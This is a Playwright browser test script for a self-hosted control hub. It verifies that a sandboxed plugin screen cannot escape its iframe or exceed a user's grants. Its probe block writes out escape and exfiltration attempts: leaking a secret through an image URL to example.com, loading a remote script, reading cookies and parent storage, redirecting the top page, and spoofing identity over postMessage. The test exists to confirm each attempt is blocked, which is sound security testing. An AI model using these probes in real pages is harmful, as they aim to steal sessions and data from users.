"""Real-browser check: set up a hub, add a person, and prove their screen is held to its sandbox and its grants.

Not part of `deno task test`, because it needs Chrome and Playwright. Start a hub with a fresh data folder,
note the code it prints, then:
    python3 tests/browser/screen_sandbox.py http://127.0.0.1:8099 <code> [folder for screenshots]
Exits 0 when every check passes.
"""
import asyncio, json, sys
from playwright.async_api import async_playwright

base, claim = sys.argv[1].rstrip("/"), sys.argv[2]
shots = sys.argv[3] if len(sys.argv) > 3 else None
OWNER_PIN, SAM_PIN = "482915", "739264"
LEVEL = "console/input/1/bus/1/level"
results = []

def check(name, ok, detail=""):
    results.append(bool(ok))
    print(("PASS  " if ok else "FAIL  ") + name + (f"\n      {detail}" if detail and not ok else ""))
    return ok

# Run inside the screen: try every way out, report what happened.
PROBES = """
async () => {
  const out = {};
  const attempt = async (name, fn) => { try { await fn(); out[name] = "ALLOWED"; } catch (e) { out[name] = "blocked"; } };
  const socket = (url) => new Promise((ok, no) => { const w = new WebSocket(url); w.onopen = () => { w.close(); ok(); }; w.onerror = () => no(new Error("refused")); });
  const base = document.baseURI.split("/screens/")[0];
  await attempt("read the hub's log over HTTP", () => fetch(base + "/api/log"));
  await attempt("ask the hub who is signed in", () => fetch(base + "/auth/me"));
  await attempt("use the superuser's tools", () => fetch(base + "/admin/api/all"));
  await attempt("open its own connection to the hub", () => socket(base.replace("http", "ws") + "/ws?screen=one-fader"));
  await attempt("reach the internet", () => fetch("https://example.com", { mode: "no-cors" }));
  await attempt("load a script from the internet", () => new Promise((ok, no) => { const s = document.createElement("script"); s.src = "https://example.com/x.js"; s.onload = ok; s.onerror = () => no(new Error()); document.head.append(s); }));
  await attempt("send data out through an image", () => new Promise((ok, no) => { const i = new Image(); i.onload = ok; i.onerror = () => no(new Error()); i.src = "https://example.com/leak.png?secret=1"; }));
  await attempt("read the page around it", () => parent.document.title);
  await attempt("read the hub page's storage", () => localStorage.getItem("x"));
  await attempt("read the session cookie", () => { if (!document.cookie) throw new Error("nothing"); });
  await attempt("open a popup", () => { const w = window.open("https://example.com"); if (!w) throw new Error(); w.close(); });
  await attempt("send the whole page somewhere else", () => { top.location.href = "https://example.com"; });
  out.origin = self.origin;
  return out;
}
"""

ASK = """([plugin, key, value]) => new Promise((res) => {
  const ref = "probe-" + Math.random();
  addEventListener("message", (e) => { if (e.data.type === "ack" && e.data.ref === ref) res(e.data); });
  parent.postMessage({ type: "set", plugin, key, value, ref }, "*");
  setTimeout(() => res({ timeout: true }), 1500);
})"""

async def main():
    async with async_playwright() as p:
        b = await p.chromium.launch(executable_path="/usr/bin/google-chrome", args=["--no-sandbox"])
        phone = dict(viewport={"width": 390, "height": 844}, has_touch=True, is_mobile=True, device_scale_factor=2)
        errors = []

        # --- The owner sets up the hub ---
        owner_ctx = await b.new_context(**phone)
        owner = await owner_ctx.new_page()
        owner.on("pageerror", lambda e: errors.append(str(e)))
        await owner.goto(base + "/")
        check("a new hub sends everyone to setup", owner.url.endswith("/setup"), owner.url)
        await owner.fill("#code", claim); await owner.fill("#name", "Evan")
        await owner.fill("#secret", OWNER_PIN); await owner.fill("#again", OWNER_PIN)
        if shots: await owner.screenshot(path=f"{shots}/1-setup.png")
        await owner.click("#go"); await owner.wait_for_url("**/s/one-fader")
        check("claiming it signs the owner in and lands on a screen", True)

        async def admin(path, body):
            r = await owner_ctx.request.post(base + path, data=json.dumps(body), headers={"content-type": "application/json"})
            return await r.json()
        async def state(plugin):
            return await (await owner_ctx.request.get(f"{base}/api/state?plugin={plugin}")).json()

        # --- The owner adds Sam, through the People page ---
        await owner.goto(base + "/admin")
        await owner.fill("#newName", "Sam"); await owner.click("#add button")
        await owner.get_by_text("Add the suggested role Musician").click()
        await owner.wait_for_selector("#roles h3:has-text('Musician')")
        check("a screen's suggested role can be added in one tap", True)
        sam = owner.locator(".item", has=owner.locator("h3", has_text="Sam"))
        await sam.get_by_role("button", name="Roles").click()
        await owner.locator("#dlgBody label.check", has_text="Musician").locator("input").check()
        await owner.fill("#confirm", OWNER_PIN); await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await sam.get_by_role("button", name="Assign").click()
        check("the People page asks for what the screen's abilities need per person", await owner.locator("#slot_ears").count() == 1)
        await owner.fill("#slot_ears", "1"); await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await sam.get_by_role("button", name="Invite").click()
        invite = (await owner.locator("#dlgBody .code").inner_text()).strip()
        await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        check("an invitation is shown for Sam", len(invite) == 9, invite)
        if shots: await owner.screenshot(path=f"{shots}/2-people.png", full_page=True)

        # --- Sam joins on another phone ---
        sam_ctx = await b.new_context(**phone)
        pg = await sam_ctx.new_page()
        pg.on("pageerror", lambda e: errors.append(str(e)))
        await pg.goto(base + "/")
        check("someone who is not signed in is sent to sign in", pg.url.endswith("/signin"), pg.url)
        await pg.goto(f"{base}/join#{invite}")
        await pg.fill("#secret", SAM_PIN); await pg.fill("#again", SAM_PIN); await pg.click("#go")
        await pg.wait_for_url("**/s/one-fader"); await pg.wait_for_timeout(900)
        check("joining lands Sam on the musician's home screen", True)
        fr = next((f for f in pg.frames if "/screens/one-fader/" in f.url), None)
        if not check("the screen is framed", fr is not None): await b.close(); return
        check("the screen is linked to the hub through the shell", await fr.inner_text("#linkText") == "Connected")
        check("it knows which ear mix is Sam's", "bus 1" in await fr.inner_text("#inputName"), await fr.inner_text("#inputName"))
        check("the shell shows who is signed in", await pg.inner_text("#who") == "Sam")
        links = await pg.locator("#links a").all_text_contents()
        check("Sam's menu has the ear mix and the account, and no superuser tools", links == ["One fader", "Account"], str(links))

        # Drag the fader with a finger.
        cdp = await sam_ctx.new_cdp_session(pg)
        el = await fr.query_selector("#fader"); box = await el.bounding_box()
        y = box["y"] + box["height"] / 2
        xs = [box["x"] + box["width"] * (0.05 + 0.01 * k) for k in range(70)]
        await cdp.send("Input.dispatchTouchEvent", {"type": "touchStart", "touchPoints": [{"x": xs[0], "y": y}]})
        for x in xs[1:]:
            await cdp.send("Input.dispatchTouchEvent", {"type": "touchMove", "touchPoints": [{"x": x, "y": y}]}); await pg.wait_for_timeout(12)
        await cdp.send("Input.dispatchTouchEvent", {"type": "touchEnd", "touchPoints": []}); await pg.wait_for_timeout(900)
        held = (await state("sim-console"))[LEVEL]
        shown = (await fr.inner_text("#db")).replace("\n", "").replace("dB", "")
        check("a drag reaches the board", held == -10, f"board holds {held}")
        check("the screen shows what the board holds", float(shown) == held, shown)
        log_text = await fr.inner_text("#log")
        check("the screen's history is filled through the bridge, as Sam's own", "You set the level" in log_text, log_text[:80])
        if shots: await pg.screenshot(path=f"{shots}/3-sam.png", full_page=True)

        # --- Now behave badly from inside the screen ---
        got = await fr.evaluate(PROBES)
        check("the screen has no origin of its own", got.pop("origin") == "null")
        for name, outcome in got.items():
            check(f"the screen cannot {name}", outcome == "blocked", outcome)
        await fr.evaluate("""() => { const f = document.createElement("form"); f.action = "https://example.com"; f.method = "post"; document.body.append(f); f.submit(); }""")
        await pg.wait_for_timeout(600)
        check("the screen cannot submit a form to the internet", "/screens/one-fader/" in fr.url and pg.url.endswith("/s/one-fader"), f"{fr.url} | {pg.url}")

        # Ask the hub, through the bridge, for things Sam was not granted.
        ack = await fr.evaluate(ASK, ["sim-switch", "switch/outlet/1/on", True])
        check("Sam's screen cannot flip a switch", ack.get("ok") is False and ack.get("error", {}).get("code") == "not_allowed", json.dumps(ack))
        ack = await fr.evaluate(ASK, ["sim-console", "console/input/1/bus/2/level", 10])
        check("Sam's screen cannot touch someone else's ear mix", ack.get("ok") is False and ack.get("error", {}).get("code") == "not_allowed", json.dumps(ack))
        check("the switch did not move", (await state("sim-switch"))["switch/outlet/1/on"] is False)
        check("the other ear mix did not move", (await state("sim-console"))["console/input/1/bus/2/level"] == -90)
        log = await (await owner_ctx.request.get(base + "/api/log?type=skillfully.command.rejected")).json()
        check("both attempts are in the log under Sam's ID", len(log) == 2 and all(e["via"] == "screen/one-fader" and e["actor"].startswith("p_") for e in log), json.dumps(log)[:200])
        check("a screen cannot say it is someone else", await fr.evaluate("""() => new Promise((res) => {
            addEventListener("message", (e) => { if (e.data.type === "hello") res(false); });
            parent.postMessage({ type: "hello", actor: "p_someoneelse" }, "*");
            setTimeout(() => res(true), 500);
        })"""))

        # --- The owner turns Sam off: the phone is cut off at once ---
        people = (await (await owner_ctx.request.get(base + "/admin/api/all")).json())["people"]
        sam_id = next(x["id"] for x in people if x["name"] == "Sam")
        await admin("/admin/api/person/disabled", {"id": sam_id, "disabled": True})
        await pg.wait_for_url("**/signin", timeout=5000)
        check("turning a person off signs their phone out within seconds", True)
        check("no page errors", not errors, "; ".join(errors))
        await b.close()

asyncio.run(main())
print(f"\n{sum(results)} of {len(results)} checks passed")
sys.exit(0 if all(results) else 1)
